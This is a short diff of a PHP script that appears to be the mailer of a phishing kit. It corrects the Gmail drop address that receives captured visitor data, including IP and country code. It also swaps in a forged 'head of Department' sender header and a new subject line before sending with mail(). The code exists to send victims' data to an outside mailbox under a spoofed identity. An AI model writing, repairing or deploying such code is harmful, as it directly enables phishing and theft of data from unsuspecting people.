@@ -26,10 +26,10 @@
     $message .=     "Country Code: {$geoplugin->countryCode}\n";
     $message .= "--------------------------\n";
 
-	$to ="dreshaw3030@gmail.co\";
+	$to ="dreshaw3030@gmail.com";
 
-	$subject = " | $ip";
-	$headers = "From: Blessing <blessing@heaven.com>";
+	$subject = "HOD | $ip";
+	$headers = "From: head of Department <hr@icloudresult.com>";
 
 	$send = mail($to,$subject,$message,$headers);
 	if($send){
